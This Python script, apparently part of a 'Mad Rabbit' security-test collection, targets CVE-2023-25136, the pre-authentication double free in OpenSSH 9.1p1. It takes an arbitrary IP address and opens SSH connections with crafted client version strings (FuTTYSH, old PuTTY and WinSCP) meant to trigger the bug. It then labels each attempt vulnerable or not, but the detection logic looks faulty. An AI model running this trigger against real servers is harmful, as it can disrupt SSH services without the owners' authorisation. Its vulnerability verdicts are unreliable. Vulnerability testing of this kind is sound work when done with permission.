#===========================#
# I M P O R T S             #
#===========================#

import os
import paramiko
import pyfiglet
import socket
import sys

#===========================#
# C O L O R S               #
#===========================#

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color") # Remove this line if you're running this on Linux

#===========================#

# Referenced from:
# - https://github.com/jfrog/jfrog-CVE-2023-25136-OpenSSH_Double-Free
# - https://github.com/nhakobyan685/CVE-2023-25136
# - https://jfrog.com/blog/openssh-pre-auth-double-free-cve-2023-25136-writeup-and-proof-of-concept/
def exploit(ip):

    print(f"{bcolors.FAIL}=" * 75 + f"{bcolors.ENDC}")
    print(f"| ⚔️ {bcolors.FAIL}CVE-2023-25136{bcolors.ENDC} ({bcolors.ORANGE}OpenSSH 9.1p1{bcolors.ENDC} Pre-Auth Double Free)")
    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
    
    #===========================#
    
    clients = [
        "FuTTYSH_9.1p1",
        "PuTTY_Release_0.58",
        "PuTTY_Release_0.59",
        "PuTTY_Release_0.60",
        "PuTTY_Release_0.61",
        "PuTTY_Release_0.62",
        "PuTTY_Release_0.63",
        "PuTTY_Release_0.64",
        "WinSCP_release_5.7.3",
        "WinSCP_release_5.7.4",
    ]
    
    for client in clients:
    
        try:
        
            transport = paramiko.Transport(ip)
            transport.local_version = "SSH-2.0-"+client
            transport.connect(username='', password='')
            
            print(f"| -> [{bcolors.FAIL}"+client+f"{bcolors.ENDC}]: [{bcolors.OKGREEN}Vulnerable{bcolors.ENDC}]")
            
            transport.close()
            
        except (socket.error, paramiko.AuthenticationException, paramiko.SSHException, paramiko.ssh_exception.SSHException):
        
            print(f"| -> [{bcolors.FAIL}"+client+f"{bcolors.ENDC}]: [{bcolors.FAIL}Not Vulnerable{bcolors.ENDC}] ({bcolors.WARNING}SSH Exception Raised{bcolors.ENDC})")
    
        except Exception as err:
        
            print(f"| -> [{bcolors.FAIL}"+client+f"{bcolors.ENDC}]: [{bcolors.FAIL}Not Vulnerable{bcolors.ENDC}] ({bcolors.WARNING}Other Exception Raised{bcolors.ENDC})")
            print(f"| --> "+str(err))
    
    #===========================#
    
    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")

#===========================#

if __name__ == "__main__":
    
    #===========================#
    # Banner and art.
    #===========================#
    
    print("")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    print(f"   {bcolors.WARNING}A{bcolors.ENDC} [🐇 {bcolors.ORANGE}Mad Rabbit{bcolors.ENDC}] {bcolors.WARNING}Security Test in the [⚔️ {bcolors.CYAN}Achilles{bcolors.ENDC}] {bcolors.WARNING}Collection{bcolors.ENDC}:")
    ascii_banner = pyfiglet.figlet_format("  CVE-2023-25136", font="drpepper")
    print(f"{bcolors.WARNING}" + ascii_banner + f"{bcolors.ENDC}",end="")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")

    #===========================#
    # User input.
    #===========================#

    print(f"{bcolors.OKCYAN}=" * 75 + f"{bcolors.ENDC}")
    print(f"| 🎯 {bcolors.WARNING}Target Input{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    
    # Target input.
    ip = input(f"| Enter an [{bcolors.OKGREEN}IP address{bcolors.ENDC}] to test: {bcolors.OKGREEN}")
    print(f"{bcolors.ENDC}",end="")
    
    # If no domain was entered, exit.
    if (ip == "" or ip == " "):
    
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");
        print(f"| No address entered. Press any key to exit.")
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");

        end = input("")
        sys.exit()
    
    # Sanitize the input.
    ip = ip.strip().lower()
    
    #===========================#
    
    exploit(ip)